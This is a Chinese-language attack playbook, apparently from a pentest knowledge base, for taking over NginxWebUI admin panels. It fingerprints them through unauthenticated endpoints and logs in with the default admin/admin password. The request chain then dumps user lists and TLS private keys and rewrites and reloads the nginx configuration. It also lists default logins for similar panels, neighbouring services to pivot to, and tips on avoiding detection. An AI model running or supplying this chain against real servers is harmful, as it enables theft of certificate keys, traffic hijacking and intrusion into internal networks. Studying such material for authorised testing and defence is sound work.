# 案例课：NginxWebUI 8000 默认口令 → 证书私钥 + 配置重载

> 来源：内网实证（2026-10）· 域：web-security / 自建面板
> 原文与凭据不入库；本文只留可复用手法。

## 一句话

NginxWebUI 的版本接口和健康接口**不带鉴权**，默认口令又是 `admin/admin`；进去以后 `/api/cert/` 直接吐证书私钥、`/api/nginx/` 能改配置并 reload，等于把同机所有站点的 TLS 和路由一起交出去。

## 前提 / 指纹

- 端口 8000（也可能被反代到 80/443 子路径）
- 指纹：`GET /api/system/version` 回 JSON 版本号；`GET /api/health` 回健康态；页面标题含 NginxWebUI
- 默认口令 `admin / admin`（产品默认，用户常不改）

## 链

```text
GET /api/system/version           → 无鉴权，确认产品与版本
POST /api/auth/login {"username":"admin","password":"admin"}  → 返回 token
GET /api/users/  (带 token)       → 全量用户
GET /api/cert/                    → 证书链 + 私钥
GET /api/nginx/                   → 反代/上游配置（内网拓扑）
POST /api/nginx/ + reload         → 改配置（写操作，先备份）
```

- token 用法：`Authorization` 头或响应里给的字段名，按版本试 `token` / `Bearer`
- 同机常见邻居：`8000` 面板 + `8848` Nacos + `3306` MySQL，一处弱口能串三条链
- 拿到配置后优先看 `upstream` / `proxy_pass` / `server_name`：内网资产清单直接成型

## 判据与边界

- 命中判据：`/api/system/version` 200 且带版本号；登录返回非空 token；`/api/users/` 有数据
- 失败边界：
  - 已改口令且无注册接口 → 只能回到口令猎取（默认字典/配置泄露），不要硬爆
  - 面板只监听 127.0.0.1 → 需先有 SSRF 或隧道
  - 部分版本 `/api/auth/login` 要求验证码，先看 `/api/auth/captcha` 是否存在
- 同族变体：宝塔 `8888`（安全入口 + `admin_path.pl`）、1Panel `1pctl user-info`、Nginx Proxy Manager `81`（默认 `admin@example.com`/`changeme`）——判据都是「无鉴权版本接口 + 默认口令」

## 检查清单

- [ ] 先 `GET /api/system/version`，不要一上来就登录（省得打草惊蛇）
- [ ] 登录成功后立即导出 `/api/nginx/` 与 `/api/cert/` 到本机案卷
- [ ] 任何 reload / 改配置前备份原文件，并在收尾时回滚
- [ ] 检查同机 8848/3306/6379 是否同一口令体系
- [ ] 证书私钥只在案卷留存，绝不写进报告或对话
